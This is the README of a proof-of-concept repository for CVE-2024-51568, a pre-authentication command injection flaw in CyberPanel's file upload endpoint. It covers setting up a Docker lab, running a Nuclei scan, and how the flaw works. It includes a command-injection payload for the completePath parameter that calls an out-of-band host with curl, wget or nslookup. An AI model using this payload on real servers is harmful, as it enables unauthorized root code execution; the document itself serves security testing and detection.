# CVE-2024-51568 - CyberPanel Command Injection PoC

A proof-of-concept environment and Nuclei template for testing CVE-2024-51568, a critical pre-authentication command injection vulnerability in CyberPanel.

## Vulnerability Details

- CVE: CVE-2024-51568
- Severity: Critical (CVSS 9.8)
- Type: Pre-authentication Command Injection
- Endpoint: `/filemanager/upload`
- Parameter: `completePath`
- Impact: Remote Code Execution with root privileges

## Quick Start

### 1. Start Vulnerable Environment

```bash
cd docker/
docker-compose up -d --build
```

### 2. Verify CyberPanel is Running

```bash
curl -I http://localhost:8090
```

### 3. Test the Vulnerability

```bash
nuclei -t template/cve-2024-51568.yaml -u http://localhost:8090
```

Sample Output:
```
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.4.10

                projectdiscovery.io

[INF] nuclei-templates are not installed, installing...
[INF] Successfully installed nuclei-templates at /root/nuclei-templates
[WRN] Loading 1 unsigned templates for scan. Use with caution.
[INF] Current nuclei version: v3.4.10 (latest)
[INF] Current nuclei-templates version: v10.2.8 (latest)
[INF] New templates added in latest release: 114
[INF] Templates loaded for current scan: 1
[INF] Targets loaded for current scan: 1
[INF] Using Interactsh Server: oast.online
[CVE-2024-51568] [http] [critical] http://localhost:8090/filemanager/upload
[INF] Scan completed in 5.706766772s. 1 matches found.
```

## How It Works

### The Vulnerability

CyberPanel v2.3.4 contains a command injection flaw in the file upload functionality:

1. Endpoint: `POST /filemanager/upload`
2. Parameter: `completePath` in multipart form data
3. Injection: Commands are executed via `ProcessUtilities.outputExecutioner()`
4. Bypass: No authentication required due to middleware bypass

### Nuclei template:

1. Extracts CSRF token from initial GET request
2. Sends malicious file upload with injected command in `completePath`
3. Uses Interactsh for out-of-band detection (HTTP/DNS callbacks)
4. Detects successful execution when the server contacts the Interactsh URL

### Detection Payload

```bash
/dev/null; curl {{interactsh-url}} || wget {{interactsh-url}} || nslookup {{interactsh-url}}; #
```

This payload ensures reliable detection across different system configurations.


## Configuration

### CyberPanel Access

- URL: http://localhost:8090
- Admin: admin
- Password: 1234567

## References

- [Original Research](https://dreyand.rs/code/review/2024/10/27/what-are-my-options-cyberpanel-v236-pre-auth-rce)
- [Metasploit Module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/cyberpanel_preauth_rce_multi_cve.rb)
- [CVE Details](https://nvd.nist.gov/vuln/detail/CVE-2024-51568)

## Security Notice

This environment contains intentional vulnerabilities for security research and education:

- DO NOT deploy in production
- DO NOT expose to public networks  
- DO NOT use on systems you don't own
- DO use for authorized security testing only

## Disclaimer

This proof-of-concept is provided for educational and authorized security testing purposes only. Users are responsible for complying with applicable laws and obtaining proper authorization before testing.
